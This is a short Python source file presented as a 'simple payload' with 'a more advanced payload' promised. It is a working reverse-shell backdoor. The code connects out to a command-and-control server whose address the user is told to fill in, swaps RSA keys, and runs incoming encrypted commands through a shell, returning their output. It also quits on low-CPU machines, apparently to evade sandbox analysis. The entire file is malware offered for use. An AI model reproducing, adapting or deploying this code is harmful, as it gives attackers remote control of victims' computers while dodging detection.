# Simple payload for debugging. A more advanced payload is coming soon

import os
import socket
import subprocess
import rsa

public_key, private_key = rsa.newkeys(2048)
public_partner = None

if os.cpu_count() <= 2:
    quit()

HOST = '127.0.0.1' # Change this host address to the address of your C2 server
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

public_partner = rsa.PublicKey.load_pkcs1(s.recv(2048))
s.send(public_key.save_pkcs1("PEM"))

while 1:
	try:
		data = rsa.decrypt(s.recv(1024), private_key).decode("UTF-8")
		data = data.strip('\n')
		if data == "quit": 
			break
		if data[:2] == "cd":
			os.chdir(data[3:])
			s.send(rsa.encrypt(str.encode("\n"), public_partner))
		elif len(data) > 0:
			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
			stdout_value = proc.stdout.read() + proc.stderr.read()
			output_str = str(stdout_value, "UTF-8")
			s.send(rsa.encrypt(str.encode("\n" + output_str + "\n"), public_partner))
	except Exception as e:
		continue
    
s.close()
